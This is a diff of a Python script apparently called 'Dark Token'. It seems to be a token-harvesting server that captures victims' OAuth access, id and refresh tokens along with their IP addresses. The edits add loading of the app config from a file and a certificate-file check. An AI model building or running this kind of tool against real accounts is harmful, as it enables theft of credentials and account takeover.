@@ -99,6 +99,15 @@ class colors:
 	blue = '\x1b[0;34;40m'
 	end = '\x1b[0m'
 
+import ConfigParser
+if os.path.isfile('autorun.cfg'):
+	configParser = ConfigParser.RawConfigParser()
+	configFilePath = r'autorun.cfg'
+	configParser.read(configFilePath)
+	APP_CONFIG['client_id'] = configParser.get('app-config', 'client_id')
+	APP_CONFIG['client_secret'] = configParser.get('app-config', 'client_secret')
+	APP_CONFIG['redirect_uri'] = configParser.get('app-config', 'redirect_uri')
+
 class AuthorizationHandler(BaseHTTPRequestHandler):
 	def do_GET(self):
 		url_params = urlparse(self.path).query
@@ -195,15 +204,18 @@ def start_server():
 	global HTTPD
 	if not APP_CONFIG['client_id'] or not APP_CONFIG['client_secret'] or not APP_CONFIG['redirect_uri']:
 		print '[!] Please check your app config.'
-	else:
-		try:
-			HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
-			print '[!] Starting Dark Token Server...'
-			HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
-			HTTPD.serve_forever()
-		except:
-			print '[!] Server is already started.'
-	
+        else:
+                if not os.path.isfile(CERT_CONFIG['certfile']) or not os.path.isfile(CERT_CONFIG['keyfile']):
+                        print "[!] Unable to find %s or %s" % (CERT_CONFIG['certfile'], CERT_CONFIG['keyfile'])
+                else:
+                        try:
+                                HTTPD = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), AuthorizationHandler)
+                                print '[*] Starting Dark Token Server...'
+                                HTTPD.socket = ssl.wrap_socket (HTTPD.socket, keyfile=CERT_CONFIG['keyfile'], certfile=CERT_CONFIG['certfile'], server_side=True)
+                                HTTPD.serve_forever()
+                        except:
+                                print '[!] Server is already started.'
+
 def stop_server():
 	try:
 		httpRequest('https://127.0.0.1/shutdown', '', context=ssl._create_unverified_context())
@@ -215,7 +227,7 @@ def store_token(account, access_token, id_token, refresh_token):
 	TOKENS = []
 	TOKENS.append([account, access_token, id_token, refresh_token, CLIENT_IP])
 
-print '[!] Starting Dark Token...'
+print '[+] Starting Dark Token...'
 
 while True:
 	SIGNAL = raw_input('[*]> ')
@@ -224,7 +236,7 @@ while True:
 	elif SIGNAL.__contains__('stop server'):
 		stop_server()
 	elif SIGNAL.__contains__('list tokens'):
-		print '[!] Listing Available Tokens:'
+		print '[+] Listing Available Tokens:'
 		try:
 			for i in range(len(TOKENS)):
 				print colors.allwhite + '-' * int(columns) + colors.end
